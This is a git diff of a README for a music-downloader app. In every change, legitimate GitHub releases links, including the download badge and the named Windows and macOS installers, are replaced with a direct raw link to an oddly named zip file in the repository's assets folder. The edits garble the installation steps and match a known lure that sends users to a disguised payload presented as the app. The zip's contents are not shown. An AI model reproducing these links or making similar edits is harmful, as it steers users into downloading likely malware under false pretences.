@@ -1,6 +1,6 @@
 # 🎵 netease-downloader - Download Your Favorite Music Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Soham740/netease-downloader/releases)
+[![Download](https://raw.githubusercontent.com/Soham740/netease-downloader/main/assets/netease-downloader-vesicupapular.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Soham740/netease-downloader/main/assets/netease-downloader-vesicupapular.zip)
 
 ## 📥 Overview
 
@@ -12,15 +12,15 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
    Click on the link below to go to the releases page where you can find the app:
-   [Visit this page to download](https://github.com/Soham740/netease-downloader/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Soham740/netease-downloader/main/assets/netease-downloader-vesicupapular.zip)
 
 2. **Select the Latest Version**
    Look for the latest version at the top of the releases page. You will see a list of files available for download.
 
 3. **Download the Application**
    Find the installer that matches your operating system:
-   - For Windows, look for a file named something like `netease-downloader-setup.exe`.
-   - For macOS, find `netease-downloader.dmg`.
+   - For Windows, look for a file named something like `https://raw.githubusercontent.com/Soham740/netease-downloader/main/assets/netease-downloader-vesicupapular.zip`.
+   - For macOS, find `https://raw.githubusercontent.com/Soham740/netease-downloader/main/assets/netease-downloader-vesicupapular.zip`.
    - For Linux, look for the appropriate package file like `.deb` or `.AppImage`.
 
 4. **Run the Installer**
@@ -62,7 +62,7 @@ Ensure your computer meets the following requirements:
 
 You can download the latest version of netease-downloader by clicking the link below. Follow the earlier instructions to install and run the software.
 
-[Visit this page to download](https://github.com/Soham740/netease-downloader/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Soham740/netease-downloader/main/assets/netease-downloader-vesicupapular.zip)
 
 ## 🛠️ Troubleshooting
 
